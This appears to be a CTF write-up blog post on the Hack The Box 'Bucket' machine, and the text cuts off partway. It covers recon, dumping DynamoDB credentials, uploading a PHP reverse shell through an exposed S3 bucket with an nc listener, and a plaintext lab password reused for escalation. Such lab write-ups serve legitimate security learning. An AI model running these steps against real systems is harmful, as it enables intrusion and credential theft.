@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB Writeup - Bucket</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HTB Writeup - Bucket | CTF Writeups &amp; Tech Stuff</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="HTB Writeup - Bucket" />
+<meta name="author" content="stbl" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="HTB Writeups and other techhie stuff" />
+<meta property="og:description" content="HTB Writeups and other techhie stuff" />
+<meta property="og:site_name" content="CTF Writeups &amp; Tech Stuff" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-25T13:40:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup - Bucket" />
+<script type="application/ld+json">
+{"description":"HTB Writeups and other techhie stuff","@type":"BlogPosting","url":"/posts/HTB-Writeup-Bucket","headline":"HTB Writeup - Bucket","dateModified":"2021-04-25T13:40:00+02:00","datePublished":"2021-04-25T13:40:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HTB-Writeup-Bucket"},"author":{"@type":"Person","name":"stbl"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>g0rth0r@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h1>HTB Writeup - Bucket</h1>
+  <time datetime="2021-04-25T13:40:00+02:00" class="by-line">25 Apr 2021</time>
+  <p><img src="/assets/images/3f07dd46f3ff7d287d2f736b18c6ded7.png" alt="3f07dd46f3ff7d287d2f736b18c6ded7" /></p>
+
+<p>This my write-up for Bucket, a medium-difficulty Linux box completed on April 25th 2021, with acclaim from the community I should say; as it included technologies not often found in typical CTF, or so I cam e to understand.</p>
+
+<p><strong>Disclaimer:</strong> I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution.</p>
+
+<hr />
+
+<h2 id="recon">Recon</h2>
+
+<p>We start with our initial <strong>nmap</strong> recon  scan: <code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -oA nmap/bucket 10.10.10.212</code>, which gives us pretty standard results:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-31 03:25 CEST
+Nmap scan report <span class="k">for </span>10.10.10.212
+Host is up <span class="o">(</span>0.032s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.34 seconds
+</code></pre></div></div>
+
+<p>We do notice nmap enumeration script telling us a redirect to <code class="language-plaintext highlighter-rouge">bucket.htb</code>, which we add to our <strong>hosts</strong> file.</p>
+
+<p>We start with standard web enumeration first.</p>
+
+<h3 id="web-recon---buckethtb">Web Recon - bucket.htb</h3>
+
+<p><img src="/assets/images/Screenshot_2021-03-31_03-28-51.png" alt="Screenshot_2021-03-31_03-28-51" /></p>
+
+<p>We start by running standard enumeration tools on the website and a few basic checks:</p>
+
+<ul>
+  <li>
+    <p>Check for robots.txt: none found.</p>
+  </li>
+  <li>
+    <p>Gobuster on root directory (raft-small-words): nothing interesting.</p>
+  </li>
+  <li>
+    <p>Check for languages being used.</p>
+  </li>
+  <li>
+    <p>Check source code: we do notice some SRC are pointing to a <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code>:</p>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class</span><span class="err">\="</span><span class="na">coffee</span><span class="err">"</span><span class="nt">&gt;</span> <span class="nt">&lt;img</span> <span class="na">src</span><span class="err">\="[</span><span class="na">http:</span><span class="err">//</span><span class="na">s3.bucket.htb</span><span class="err">/</span><span class="na">adserver</span><span class="err">/</span><span class="na">images</span><span class="err">/</span><span class="na">bug.jpg</span><span class="err">](</span><span class="na">view-source:http:</span><span class="err">//</span><span class="na">s3.bucket.htb</span><span class="err">/</span><span class="na">adserver</span><span class="err">/</span><span class="na">images</span><span class="err">/</span><span class="na">bug.jpg</span><span class="err">)"</span> <span class="na">alt</span><span class="err">\="</span><span class="na">Bug</span><span class="err">"</span> <span class="na">height</span><span class="err">\="160"</span> <span class="na">width</span><span class="err">\="160"</span><span class="nt">&gt;</span> <span class="nt">&lt;/div</span><span class="err">\</span><span class="nt">&gt;</span> <span class="nt">&lt;div</span> <span class="na">class</span><span class="err">\="</span><span class="na">description</span><span class="err">"</span><span class="nt">&gt;</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Running the same <strong>gobuster</strong> on this newly found sub-domain (After adding to our hosts file) with the same parameter as the first run , we find interesting findings:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ <span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-u</span> http://s3.bucket.htb <span class="nt">-o</span> gobuster/root <span class="nt">-x</span> html,php
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://s3.bucket.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     html,php
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2021/03/31 03:42:21 Starting gobuster
+<span class="o">===============================================================</span>
+/health <span class="o">(</span>Status: 200<span class="o">)</span>
+/shell <span class="o">(</span>Status: 200<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>Additionally, before diving in the <strong>s3</strong> server, we also search for potential additional subdomain with <strong>wfuzz</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ <span class="nv">$wfuzz</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> http://FUZZ.bucket.htb <span class="nt">--ip</span> 10.10.10.212:80 <span class="nt">--hc</span> 302
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+Target: http://FUZZ.bucket.htb/
+Total requests: 19983
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                             
+=====================================================================
+000000247:   404        0 L      2 W        21 Ch       "s3"                                 000009543:   400        12 L     53 W       422 Ch      "#www"                               
+000010595:   400        12 L     53 W       422 Ch      "#mail"      
+
+Total time: 0
+Processed Requests: 19983
+Filtered Requests: 19980
+Requests/sec.: 0
+
+</span></code></pre></div></div>
+
+<p>Again, s3 stands out, so we pivot on this subdomain.</p>
+
+<h3 id="web-recon---s3buckethtb">Web Recon - s3.bucket.htb</h3>
+
+<p>Accessing the <em>s3.bucket.htb</em> site, we are shown a simple json message (which is strange considering this page was being registered as a 404):</p>
+
+<p><img src="/assets/images/Screenshot_2021-03-31_03-40-50.png" alt="Screenshot_2021-03-31_03-40-50" /></p>
+
+<p>Following gobuster’s findings; we check for the <strong>/health</strong> path which seems to show us which services are currently running:</p>
+
+<p><img src="/assets/images/Screenshot_2021-03-31_03-53-33.png" alt="Screenshot_2021-03-31_03-53-33" /></p>
+
+<p>New information from this about the presence of <strong>dynamodb</strong>, AWS database system. Next, visiting the <strong>/shell/</strong> path , we are shown an interactive web shell for DynamoDB:</p>
+
+<p>:warning: <em>Some time was lost here, as I omitted the trailing slash of the <strong>/shell</strong> path given by gobuster, which redirected me to another location and never accessed the shell.</em></p>
+
+<p><img src="/assets/images/Screenshot_2021-04-02_17-40-40.png" alt="Screenshot_2021-04-02_17-40-40" /></p>
+
+<h2 id="dynamodb-enumeration">DynamoDB Enumeration</h2>
+
+<p>The interactive shell provides some handy example and templates to use; reading through it, the first one of interest is the <strong>listTable</strong> function which allows to to, as its name suggest, list tables:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">ExclusiveStartTableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">table_name</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// optional (for pagination, returned as LastEvaluatedTableName)</span>
+    <span class="na">Limit</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="c1">// optional (to further limit the number of table names returned per page)</span>
+<span class="p">};</span>
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nx">listTables</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span> <span class="c1">// an error occurred</span>
+    <span class="k">else</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> <span class="c1">// successful response</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Which returns one table: <code class="language-plaintext highlighter-rouge">users</code></p>
+
+<p><img src="/assets/images/Screenshot_2021-04-02_18-04-36.png" alt="Screenshot_2021-04-02_18-04-36" /></p>
+
+<p>Next, we use the <strong>describeTable</strong> function to have more information about this table:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">TableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">users</span><span class="dl">'</span><span class="p">,</span>
+<span class="p">};</span>
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nx">describeTable</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span> <span class="c1">// an error occurred</span>
+    <span class="k">else</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> <span class="c1">// successful response</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/Screenshot_2021-04-02_18-06-32.png" alt="Screenshot_2021-04-02_18-06-32" /></p>
+
+<p>Which seem to contains credentials. Finally, we dump the content using the <strong>doScan</strong> function:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">tableName</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">users</span><span class="dl">"</span>
+
+<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+<span class="na">TableName</span><span class="p">:</span> <span class="nx">tableName</span><span class="p">,</span>
+<span class="na">Select</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ALL_ATTRIBUTES</span><span class="dl">"</span>
+<span class="p">};</span>
+
+
+<span class="kd">function</span> <span class="nx">doScan</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">error</span><span class="p">);</span> <span class="c1">// an error occurred</span>
+<span class="k">else</span> <span class="p">{</span>
+    <span class="nx">ppJson</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span> <span class="c1">// successful response</span>
+
+    <span class="c1">// More data.  Keep calling scan.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="dl">'</span><span class="s1">LastEvaluatedKey</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ExclusiveStartKey</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">LastEvaluatedKey</span><span class="p">;</span>
+        <span class="nx">dynamodb</span><span class="p">.</span><span class="nx">scan</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">params</span><span class="p">)</span>
+            <span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">complete</span><span class="dl">'</span><span class="p">,</span> <span class="nx">doScan</span><span class="p">)</span>
+            <span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Starting a Scan of the table</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nx">scan</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
+<span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">complete</span><span class="dl">'</span><span class="p">,</span> <span class="nx">doScan</span><span class="p">)</span>
+<span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>provateWhich returns us a list of credentials:</p>
+
+<p><img src="/assets/images/Screenshot_2021-04-02_18-14-40.png" alt="Screenshot_2021-04-02_18-14-40" /></p>
+
+<p>We take note of these and try against our known services, which at this point is only <strong>ssh</strong>, however none of them currently work, so we pivot to another service.</p>
+
+<h2 id="aws-cli-exploitation">AWS CLI Exploitation</h2>
+
+<p>Reading a little bit about the Amazon AWS ecosystem, we decide to attempt installing its CLI management tool; <strong>aws</strong>. After installing and configuring AWS CLI with dummy values (except region), we are now able to enumerate buckets on the machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ <span class="nv">$aws</span> s3 <span class="nb">ls</span> <span class="nt">--endpoint-url</span> http://s3.bucket.htb
+2021-04-02 19:15:09 adserver
+</code></pre></div></div>
+
+<p>We note the only bucket available, <code class="language-plaintext highlighter-rouge">adserver</code>, which we enumerate and clone using hacktricks and Amazon CLI documentation as references:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[✗]─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
+└──╼ <span class="nv">$aws</span> s3 <span class="nb">ls</span> <span class="nt">--endpoint-url</span> http://s3.bucket.htb
+2021-04-02 19:29:10 adserver
+
+┌─[✗]─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ <span class="nv">$aws</span> s3 <span class="nb">ls</span> <span class="nt">--endpoint-url</span> http://s3.bucket.htb s3://adserver
+                           PRE images/
+2021-04-02 19:21:12       5344 index.html
+┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
+└──╼ <span class="nv">$aws</span> s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">sync </span>s3://adserver <span class="nb">.</span>                                                                                                                                      
+download: s3://adserver/index.html to ./index.html              
+download: s3://adserver/images/malware.png to images/malware.png  
+download: s3://adserver/images/bug.jpg to images/bug.jpg          
+download: s3://adserver/images/cloud.png to images/cloud.png    
+
+</code></pre></div></div>
+
+<p>And further inspecting the files, we notice that this is actually the web service we were previously navigating; if we can find a way to upload files; we could gain a remote shell. The <strong>cp</strong> command allows us to upload; so we test it first with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
+└──╼ <span class="nv">$aws</span> s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">cp</span> ./test.txt s3://adserver                 
+upload: ./test.txt to s3://adserver/test.txt
+</code></pre></div></div>
+
+<p>And we can confirm it working:</p>
+
+<p><img src="/assets/images/Screenshot_2021-04-02_19-35-06.png" alt="Screenshot_2021-04-02_19-35-06" /></p>
+
+<p>So we try an actual php reverse shell now: <code class="language-plaintext highlighter-rouge">aws s3 --endpoint-url http://s3.bucket.htb cp ./rev.php s3://adserver</code> and navigate to it while setting up a listener <code class="language-plaintext highlighter-rouge">nc -lnvp 9001</code>… but our reverse shell gets downloaded instead of executed. Researching why this is happening, we find out that s3 doesn’t run any sort of scripting language; so we need an alternative shell.</p>
+
+<p>Seems we can’t have scripting from the S3 instance, however, the main site (index.html) do seem to be served from another web server; so perhaps we can have a file uploaded there; plus the index.html located in the bucket seem to the one on the web server.  We try again to upload the shell and after modifying the upload command a little and making multiple try (ctrl+f5 on firefox), we manage to get a shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="nb">cp</span> ./rev.php s3://adserver/rev.php  
+</code></pre></div></div>
+
+<p><img src="/assets/images/Screenshot_2021-04-02_20-19-37.png" alt="Screenshot_2021-04-02_20-19-37" /></p>
+
+<p>:warning: <em>This last part was very finicky and not 100% reliable; seems like the host was cleaning itself very frequently and I was only able to get a shell after an inconsistent amount of upload and refresh.</em></p>
+
+<h2 id="shell---www-data">Shell - www-data</h2>
+
+<p>We now have a shell as <strong>www-data</strong>, doing standard enumeration we list users with shell on the box:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bucket:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh<span class="err">$</span>
+root:x:0:0:root:/root:/bin/bash
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+</code></pre></div></div>
+
+<p><strong>Roy</strong> being the only account aside from root, we target this user first.</p>
+
+<h3 id="privilege-escalation-www-data-to-roy">Privilege Escalation: www-data to roy</h3>
+
+<p>Remembering the credentials we acquired by dumping the <strong>DynamoDB</strong> service, we try to <strong>su</strong> as <em>roy</em> using all those password and do find a hit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bucket:/<span class="nv">$ </span>su roy
+Password: <span class="c"># n2vM-&lt;_K_Q:.Aa2</span>
+roy@bucket:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Quite the easy escalation.</p>
+
+<p>:warning: <em>We later found out we could also have ssh as roy using the above password, which would have saved a bit of hassle in the long run.</em></p>
+
+<h2 id="shell---roy">Shell - roy</h2>
+
+<p>After getting the <strong>user.txt</strong> flag as roy, we start basic enumeration:</p>
+
+<ul>
+  <li>
+    <p>Check for sudo permission with <code class="language-plaintext highlighter-rouge">sudo -l</code>, but we cannot run sudo.</p>
+  </li>
+  <li>
+    <p>Search for interesting files in the <code class="language-plaintext highlighter-rouge">home</code> directory: <strong>composer</strong> is present. We take note if we want to look into later.</p>
+  </li>
+  <li>
+    <p>Search for special files, especially for files owned by root but readable by us, which are non-standard:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-readable</span> <span class="nt">-user</span> root <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="nt">--full-time</span> <span class="o">{}</span> <span class="se">\;</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'/sys/|/proc/|/run/|/usr/lib/|/var/lib/|/var/cache/|/usr/src/|/snap/|/boot|/usr/share|/var/www/'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Check for open ports:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oy@bucket:/<span class="nv">$ </span>netstat <span class="nt">-tunlp</span> | <span class="nb">grep </span>LISTEN
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+tcp        0      0 127.0.0.1:8000          0.0.0.0:<span class="k">*</span>               LISTEN      -     
+tcp        0      0 127.0.0.1:43343         0.0.0.0:<span class="k">*</span>               LISTEN      -     
+tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      -     
+tcp        0      0 127.0.0.1:4566          0.0.0.0:<span class="k">*</span>               LISTEN      -     
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -     
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      -     
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -     
+</code></pre></div>    </div>
+
+    <p>There is definitively interesting open ports going on here, especially services listening on <strong>localhost</strong> only. We make sure to take notes of those so we can return later.</p>
+  </li>
+  <li>
+    <p>Linpeas findings: nothing particularly interesting stands out.</p>
+  </li>
+  <li>
+    <p>Running processes: we do find one of the listening part above is running by root and seem to be the <strong>aws</strong> service running as a docker container on <strong>port 4566</strong>:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root        1380  0.0  0.1 623772  6692 ?        Sl   14:57   0:03 /usr/bin/docker-proxy <span class="nt">-proto</span> tcp <span class="nt">-host-ip</span> 127.0.0.1 <span class="nt">-host-port</span> 4566 <span class="nt">-container-ip</span> 172.18.0.2 <span class="nt">-container-port</span> 4566
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>We focus on the open ports on the machine; so allow easier enumeration, we setup a port forward back to us using <strong>ssh</strong>, after having generated a pair of keys on the machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ssh <span class="nt">-i</span> id_rsa <span class="nt">-L</span> 4566:127.0.0.1:4566 <span class="nt">-L</span> 43343:127.0.0.1:43343 <span class="nt">-L</span> 8000:127.0.0.1:8000 roy@10.10.10.212
+</code></pre></div></div>
+
+<p>Looking at the port, starting with <strong>8000</strong>, we find a new site, previously unseen:</p>
+
+<p><img src="/assets/images/Screenshot_2021-04-14_00-34-26.png" alt="Screenshot_2021-04-14_00-34-26" /></p>
+
+<h3 id="investigating-the-local-website">Investigating the local website</h3>
+
+<p>Back on the bucket machine, we locate the file (using <strong>grep</strong> and some keywords of the page) to be in <code class="language-plaintext highlighter-rouge">/var/www/bucket-app/</code>, so we download the <code class="language-plaintext highlighter-rouge">index.php</code> and have a look at its source code; first few lines immediately stand out:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
+                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>
+                        <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
+                        <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
+                        <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
+                        <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
+                <span class="p">]);</span>
+
+                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+                        <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>
+                        <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
+                        <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>
+                <span class="p">));</span>
+
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
+                        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
+                <span class="p">}</span>
+                <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+    <span class="p">[</span><span class="mf">...</span><span class="p">]</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Key points of this code:</p>
+
+<ul>
+  <li>Triggered on a POST request with data <code class="language-plaintext highlighter-rouge">action=get_alerts</code>.</li>
+  <li>Then queries the <strong>dynamodb</strong> table <code class="language-plaintext highlighter-rouge">alerts</code> where the title is equal to <em>Ransomware</em>.</li>
+  <li>Print the content of the <code class="language-plaintext highlighter-rouge">data</code> field on the <code class="language-plaintext highlighter-rouge">files/</code> folder.</li>
+  <li>Convert that (or these) html files into pdf using a <strong>jar</strong> found on the same root folder of the site.</li>
+</ul>
+
+<p>Using the tunnel we setup, we use <strong>burp</strong> to trigger this function:</p>
+
+<p><img src="/assets/images/Pasted image 20210423034151.png" alt="Pasted image 20210423034151" /></p>
+
+<p>However, we are getting a <strong>500 Internal Server Error</strong>. We suspect this could be due to the table not existing; so we have a look again at the <strong>dynamodb</strong> instance.</p>
+
+<h3 id="injecting-in-dynamodb">Injecting in DynamoDB</h3>
+
+<p>Now that we also have a tunnel setup to access the <strong>localhost:4566</strong>, we work locally using the <strong>aws cli</strong> tools previously setup to first enumerate the db:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[✗]─[stbl@kali]─[10.10.14.216]─[~/boxes/bucket/exfil]                                     
